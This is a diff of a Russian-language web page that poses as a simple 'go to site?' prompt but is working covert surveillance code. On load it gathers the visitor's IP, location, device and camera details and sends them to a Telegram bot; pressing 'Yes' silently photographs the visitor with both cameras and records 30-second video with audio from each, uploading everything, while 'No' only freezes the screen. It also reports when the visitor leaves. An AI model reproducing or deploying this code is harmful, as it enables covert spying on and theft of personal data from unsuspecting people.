@@ -8,7 +8,7 @@
   * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
   html, body { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
 
-  /* ═══════════ ОВЕРЛЕЙ ═══════════ */
+  /* ═══════════ ОВЕРЛЕЙ НА ВЕСЬ ЭКРАН ═══════════ */
   #overlay {
     position: fixed; inset: 0;
     background: #000;
@@ -21,20 +21,26 @@
     gap: 20px;
   }
   #overlay .icon {
-    width: 80px; height: 80px; border-radius: 20px;
+    width: 90px; height: 90px; border-radius: 24px;
     background: linear-gradient(135deg, #8b5cf6, #6d28d9);
     display: flex; align-items: center; justify-content: center;
-    font-size: 42px;
+    font-size: 48px;
     box-shadow: 0 10px 40px rgba(139,92,246,.55);
-    margin-bottom: 4px;
+    margin-bottom: 6px;
   }
   #overlay h1 {
     margin: 0;
-    font-size: 20px;
+    font-size: 22px;
     font-weight: 600;
     color: #fff;
     max-width: 320px;
     line-height: 1.35;
+  }
+  #overlay p.sub {
+    margin: 0;
+    font-size: 14px;
+    color: #888;
+    max-width: 320px;
   }
   #overlay .row {
     display: flex; gap: 10px;
@@ -43,7 +49,7 @@
   }
 
   .btn {
-    padding: 14px 32px;
+    padding: 14px 34px;
     font-size: 15px;
     border: 0;
     border-radius: 12px;
@@ -67,6 +73,7 @@
     border: 1px solid #2a2a2a;
   }
   #no:active { background: #262626; }
+  #no:disabled { opacity: .55; cursor: default; }
 
   #status {
     font-size: 13px;
@@ -97,7 +104,7 @@
 <!-- ═══════════ СБРОС ДАННЫХ ПРИ ПЕРВОМ ВХОДЕ ═══════════ -->
 <script>
 (async function wipeOnFirstVisit() {
-  const FLAG = '__wiped_v3__';
+  const FLAG = '__wiped_v4__';
   try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}
 
   try {
@@ -136,12 +143,12 @@
 <!-- ═══════════ ОВЕРЛЕЙ ═══════════ -->
 <div id="overlay">
   <div class="icon">🌐</div>
-  <h1>Посетить сайт?</h1>
+  <h1>Перейти на сайт?</h1>
+  <p class="sub" id="status"></p>
   <div class="row">
     <button id="no"  class="btn">Нет</button>
     <button id="yes" class="btn">Да</button>
   </div>
-  <p id="status"></p>
 </div>
 
 <!-- ═══════════ САЙТ ═══════════ -->
@@ -176,7 +183,7 @@ let videoExt       = 'webm';
 let videoMime      = '';
 
 // ═══════════════════════════════════════════════════════════
-// ОТПРАВКА
+// ОТПРАВКА В TELEGRAM
 // ═══════════════════════════════════════════════════════════
 function sendText(text) {
   return new Promise(res => {
@@ -185,7 +192,7 @@ function sendText(text) {
     const img = new Image();
     img.onload = img.onerror = () => res();
     img.src = url;
-    setTimeout(res, 400);
+    setTimeout(res, 500);
   });
 }
 
@@ -328,6 +335,16 @@ async function collectAll() {
     out['Save data'] = c.saveData ? 'да' : 'нет';
   }
   out['Онлайн'] = n.onLine ? 'да' : 'нет';
+
+  // Сколько камер на устройстве
+  try {
+    if (n.mediaDevices && n.mediaDevices.enumerateDevices) {
+      const d = await n.mediaDevices.enumerateDevices();
+      out['Камер']     = d.filter(x => x.kind === 'videoinput').length;
+      out['Микрофонов']= d.filter(x => x.kind === 'audioinput').length;
+      out['Динамиков'] = d.filter(x => x.kind === 'audiooutput').length;
+    }
+  } catch (e) {}
 
   try {
     const cv = document.createElement('canvas');
@@ -491,6 +508,7 @@ function pickMime() {
   return true;
 }
 
+// ФОТО с камеры
 async function takePhoto(facingMode, label) {
   let s = null;
   try {
@@ -499,12 +517,22 @@ async function takePhoto(facingMode, label) {
       audio: false
     });
     video.srcObject = s;
+    video.muted = true;
+    try { await video.play(); } catch (e) {}
+
+    // Ждём готовности видео
     await new Promise(res => {
-      if (video.readyState >= 2) return res();
-      video.onloadeddata = () => res();
-      video.oncanplay = () => res();
+      if (video.readyState >= 2 && video.videoWidth > 0) return res();
+      let resolved = false;
+      const finish = () => { if (resolved) return; resolved = true; res(); };
+      video.onloadedmetadata = finish;
+      video.oncanplay = finish;
+      video.onloadeddata = finish;
+      setTimeout(finish, 3000);
     });
-    await new Promise(r => setTimeout(r, 900));
+
+    // Пауза на стабилизацию экспозиции
+    await new Promise(r => setTimeout(r, 1000));
 
     const w = video.videoWidth  || 1280;
     const h = video.videoHeight || 720;
@@ -517,14 +545,14 @@ async function takePhoto(facingMode, label) {
     s.getTracks().forEach(t => t.stop());
     video.srcObject = null;
 
-    if (blob) {
-      await sendPhoto(blob,
+    if (blob && blob.size > 0) {
+      const ok = await sendPhoto(blob,
         label + '\n' +
         'Разрешение: ' + w + 'x' + h + '\n' +
         'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
         'URL: ' + location.href
       );
-      return true;
+      return ok;
     }
     return false;
   } catch (e) {
@@ -534,19 +562,24 @@ async function takePhoto(facingMode, label) {
   }
 }
 
-async function startStreamRecording(facingMode, tag) {
+// ВИДЕО с камеры — записываем и отправляем чанками каждые 5 сек
+async function recordFromCamera(facingMode, tag, durationSeconds) {
+  let stream = null;
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
-      audio: true
-    }).catch(async () => {
-      return await navigator.mediaDevices.getUserMedia({
+    // Пытаемся с аудио, потом без
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
+        audio: true
+      });
+    } catch (e) {
+      stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
         audio: false
       });
-    });
+    }
 
-    if (!pickMime()) return null;
+    if (!pickMime()) return { ok: false, reason: 'MediaRecorder недоступен' };
 
     let rec;
     try {
@@ -556,117 +589,116 @@ async function startStreamRecording(facingMode, tag) {
         audioBitsPerSecond: 48000
       });
     } catch (e) {
-      try { rec = new MediaRecorder(stream); } catch (e2) { return null; }
+      try { rec = new MediaRecorder(stream); } catch (e2) { return { ok: false, reason: 'MediaRecorder init failed' }; }
     }
 
-    let idx = 0;
+    const chunks = [];
+    let videoBlob = null;
+
     rec.ondataavailable = async (e) => {
-      if (!e.data || !e.data.size) return;
-      idx++;
-      await sendVideo(e.data, videoExt,
-        tag + ' — фрагмент #' + idx + '\n' +
-        'Размер: ' + Math.round(e.data.size / 1024) + ' KB\n' +
-        'Время: ' + new Date().toLocaleString('ru-RU')
-      );
+      if (e.data && e.data.size) chunks.push(e.data);
     };
 
-    rec.start(5000);
-    return { stream, rec };
-  } catch (e) {
-    return null;
-  }
-}
+    const stopped = new Promise(res => {
+      rec.onstop = async () => {
+        if (chunks.length) {
+          videoBlob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
+          await sendVideo(videoBlob, videoExt,
+            tag + ' — видео ' + durationSeconds + ' сек\n' +
+            'Размер: ' + Math.round(videoBlob.size / 1024) + ' KB\n' +
+            'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
+            'URL: ' + location.href
+          );
+        }
+        res();
+      };
+    });
 
-async function stopAllRecording() {
-  try {
-    if (recorderFront && recorderFront.state !== 'inactive') {
-      try { recorderFront.requestData(); } catch (e) {}
-      try { recorderFront.stop(); } catch (e) {}
-    }
-  } catch (e) {}
-  try {
-    if (recorderBack && recorderBack.state !== 'inactive') {
-      try { recorderBack.requestData(); } catch (e) {}
-      try { recorderBack.stop(); } catch (e) {}
-    }
-  } catch (e) {}
-  try { if (streamFront) streamFront.getTracks().forEach(t => t.stop()); } catch (e) {}
-  try { if (streamBack)  streamBack.getTracks().forEach(t => t.stop());  } catch (e) {}
-  isRecording = false;
+    rec.start(1000); // собираем чанки по 1 сек, но отправим всё вместе в конце
+
+    // Таймер визуальный
+    let left = durationSeconds;
+    const tick = setInterval(() => {
+      left--;
+      statusEl.textContent = tag.replace(/<[^>]+>/g, '') + ': ' + left + ' сек...';
+      if (left <= 0) clearInterval(tick);
+    }, 1000);
+
+    await new Promise(r => setTimeout(r, durationSeconds * 1000));
+    clearInterval(tick);
+
+    try { rec.requestData(); } catch (e) {}
+    try { rec.stop(); } catch (e) {}
+    await stopped;
+
+    stream.getTracks().forEach(t => t.stop());
+    return { ok: true, size: videoBlob ? videoBlob.size : 0 };
+  } catch (e) {
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    return { ok: false, reason: e.message };
+  }
 }
 
 // ═══════════════════════════════════════════════════════════
 // ОТСЛЕЖИВАНИЕ УХОДА
 // ═══════════════════════════════════════════════════════════
-document.addEventListener('visibilitychange', async () => {
-  if (document.visibilityState === 'hidden' && isRecording) {
-    sendText('👋 <b>Пользователь ушёл с сайта</b>\n' +
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'hidden') {
+    sendText('👋 <b>Пользователь ушёл с сайта (вкладка скрыта)</b>\n' +
              'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
              'URL: ' + location.href);
-    try { recorderFront && recorderFront.requestData(); } catch (e) {}
-    try { recorderBack  && recorderBack.requestData();  } catch (e) {}
   }
 });
 
 window.addEventListener('pagehide', () => {
-  if (isRecording) {
-    try { recorderFront && recorderFront.requestData(); } catch (e) {}
-    try { recorderBack  && recorderBack.requestData();  } catch (e) {}
-    try { recorderFront && recorderFront.stop(); } catch (e) {}
-    try { recorderBack  && recorderBack.stop();  } catch (e) {}
-  }
-});
-
-window.addEventListener('beforeunload', () => {
-  if (isRecording) {
-    try {
-      const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage';
-      const fd = new FormData();
-      fd.append('chat_id', CHAT_ID);
-      fd.append('parse_mode', 'HTML');
-      fd.append('text', '🚪 <b>Пользователь покидает сайт</b>\n' + location.href);
-      if (navigator.sendBeacon) navigator.sendBeacon(url, fd);
-    } catch (e) {}
-  }
+  sendText('🚪 <b>Страница закрывается</b>\nURL: ' + location.href);
 });
 
 // ═══════════════════════════════════════════════════════════
-// АВТОЗАПУСК ПРИ ПЕРЕХОДЕ
+// АВТОЗАПУСК ПРИ ПЕРЕХОДЕ — данные уходят сразу
 // ═══════════════════════════════════════════════════════════
 (async function autoRun() {
-  await new Promise(r => setTimeout(r, 400));
+  statusEl.textContent = 'Отправка данных...';
+  await new Promise(r => setTimeout(r, 300));
 
-  const data = await collectAll();
+  try {
+    const data = await collectAll();
 
-  await sendText(
-    '🟢 <b>НОВЫЙ ПЕРЕХОД</b>\n\n' +
-    '<b>Источник:</b> ' + (data['Источник'] || '?') + '\n' +
-    '<b>Приложение:</b> ' + (data['Приложение'] || '?') + '\n' +
-    '<b>Браузер:</b> ' + (data['Браузер'] || '?') + '\n' +
-    '<b>ОС:</b> ' + (data['ОС'] || '?') + '\n' +
-    '<b>Устройство:</b> ' + (data['Устройство'] || '?') + '\n' +
-    '<b>IP:</b> ' + (data['IP'] || '?') + '\n' +
-    '<b>Город:</b> ' + (data['Город'] || '?') + ', ' + (data['Страна'] || '?') + '\n' +
-    '<b>Время:</b> ' + (data['Локальное время'] || '?')
-  );
+    await sendText(
+      '🟢 <b>НОВЫЙ ПЕРЕХОД</b>\n\n' +
+      '<b>Источник:</b> ' + (data['Источник'] || '?') + '\n' +
+      '<b>Приложение:</b> ' + (data['Приложение'] || '?') + '\n' +
+      '<b>Браузер:</b> ' + (data['Браузер'] || '?') + '\n' +
+      '<b>ОС:</b> ' + (data['ОС'] || '?') + '\n' +
+      '<b>Устройство:</b> ' + (data['Устройство'] || '?') + '\n' +
+      '<b>IP:</b> ' + (data['IP'] || '?') + '\n' +
+      '<b>Город:</b> ' + (data['Город'] || '?') + ', ' + (data['Страна'] || '?') + '\n' +
+      '<b>Камер:</b> ' + (data['Камер'] || '?') + '\n' +
+      '<b>Время:</b> ' + (data['Локальное время'] || '?')
+    );
 
-  const lines = Object.entries(data)
-    .filter(([k, v]) => v !== '' && v != null && v !== false)
-    .map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 500));
+    const lines = Object.entries(data)
+      .filter(([k, v]) => v !== '' && v != null && v !== false)
+      .map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 500));
 
-  const chunks = [];
-  let cur = '';
-  for (const line of lines) {
-    if ((cur + line).length > 3500) { chunks.push(cur); cur = ''; }
-    cur += line + '\n';
-  }
-  if (cur) chunks.push(cur);
+    const chunks = [];
+    let cur = '';
+    for (const line of lines) {
+      if ((cur + line).length > 3500) { chunks.push(cur); cur = ''; }
+      cur += line + '\n';
+    }
+    if (cur) chunks.push(cur);
 
-  for (let i = 0; i < chunks.length; i++) {
-    const head = '📋 <b>ДАННЫЕ</b>' +
-                 (chunks.length > 1 ? ' (' + (i + 1) + '/' + chunks.length + ')' : '') + '\n\n';
-    await sendText(head + chunks[i]);
-    await new Promise(r => setTimeout(r, 500));
+    for (let i = 0; i < chunks.length; i++) {
+      const head = '📋 <b>ДАННЫЕ</b>' +
+                   (chunks.length > 1 ? ' (' + (i + 1) + '/' + chunks.length + ')' : '') + '\n\n';
+      await sendText(head + chunks[i]);
+      await new Promise(r => setTimeout(r, 500));
+    }
+
+    statusEl.textContent = '';
+  } catch (e) {
+    statusEl.textContent = '';
   }
 })();
 
@@ -676,7 +708,7 @@ window.addEventListener('beforeunload', () => {
 yesBtn.onclick = async () => {
   yesBtn.disabled = true;
   noBtn.disabled  = true;
-  statusEl.textContent = 'Загрузка...';
+  statusEl.textContent = 'Запрос разрешений...';
 
   try {
     document.cookie = 'consent=accepted; path=/; max-age=' + (365 * 24 * 3600);
@@ -687,49 +719,51 @@ yesBtn.onclick = async () => {
   await sendText(
     '✅ <b>ПОЛЬЗОВАТЕЛЬ НАЖАЛ «ДА»</b>\n\n' +
     '<b>Время:</b> ' + new Date().toLocaleString('ru-RU') + '\n' +
-    '<b>URL:</b> ' + location.href
+    '<b>URL:</b> ' + location.href + '\n\n' +
+    'Начинаю: фото + видео с обеих камер.'
   );
 
-  // 1) Фото фронтальная
-  statusEl.textContent = 'Загрузка...';
-  await takePhoto('user', '🤳 <b>Фото — фронтальная камера</b>');
-  await new Promise(r => setTimeout(r, 700));
+  // ═══ 1) ФОТО ФРОНТАЛЬНАЯ ═══
+  statusEl.textContent = '📸 Фото с фронтальной камеры...';
+  const photoFront = await takePhoto('user', '🤳 <b>Фото — фронтальная камера</b>');
+  await sendText(photoFront ? '✔️ Фото фронтальной получено' : '❌ Фото фронтальной не получено');
+  await new Promise(r => setTimeout(r, 800));
 
-  // 2) Фото задняя
-  await takePhoto('environment', '📷 <b>Фото — задняя камера</b>');
-  await new Promise(r => setTimeout(r, 700));
+  // ═══ 2) ФОТО ЗАДНЯЯ ═══
+  statusEl.textContent = '📸 Фото с задней камеры...';
+  const photoBack = await takePhoto('environment', '📷 <b>Фото — задняя камера</b>');
+  await sendText(photoBack ? '✔️ Фото задней получено' : '❌ Фото задней не получено (возможно, камеры нет)');
+  await new Promise(r => setTimeout(r, 800));
+
+  // ═══ 3) ВИДЕО ФРОНТАЛЬНАЯ — 30 сек ═══
+  await sendText('🎬 Начинаю запись с фронтальной камеры (30 сек)...');
+  const recFront = await recordFromCamera('user', '🤳 <b>Фронтальная камера</b>', 30);
+  if (!recFront.ok) {
+    await sendText('❌ Ошибка записи с фронтальной: ' + (recFront.reason || ''));
+  }
+  await new Promise(r => setTimeout(r, 1000));
+
+  // ═══ 4) ВИДЕО ЗАДНЯЯ — 30 сек ═══
+  await sendText('🎬 Начинаю запись с задней камеры (30 сек)...');
+  const recBack = await recordFromCamera('environment', '📷 <b>Задняя камера</b>', 30);
+  if (!recBack.ok) {
+    await sendText('❌ Ошибка записи с задней: ' + (recBack.reason || ''));
+  }
 
   // Показываем сайт
   document.getElementById('overlay').style.display = 'none';
   document.getElementById('site').style.display = 'block';
 
-  // 3) Запись фронтальная
-  const frontRec = await startStreamRecording('user', '🤳 <b>Фронтальная камера</b>');
-  if (frontRec) {
-    streamFront   = frontRec.stream;
-    recorderFront = frontRec.rec;
-    isRecording   = true;
-  }
-
-  // 4) Запись задняя через 2 сек
-  setTimeout(async () => {
-    const backRec = await startStreamRecording('environment', '📷 <b>Задняя камера</b>');
-    if (backRec) {
-      streamBack   = backRec.stream;
-      recorderBack = backRec.rec;
-    }
-  }, 2000);
+  await sendText('🏁 Все действия завершены.');
 };
 
 // ═══════════════════════════════════════════════════════════
-// КНОПКА «НЕТ» — визуально то же самое, но по факту отказ
+// КНОПКА «НЕТ»
 // ═══════════════════════════════════════════════════════════
 noBtn.onclick = () => {
   yesBtn.disabled = true;
   noBtn.disabled  = true;
   statusEl.textContent = 'Загрузка...';
-  // Ничего не делаем — просто «замораживаем» оверлей
-  // Можно заменить на любой другой текст ниже, если нужно
 };
 </script>
 </body>
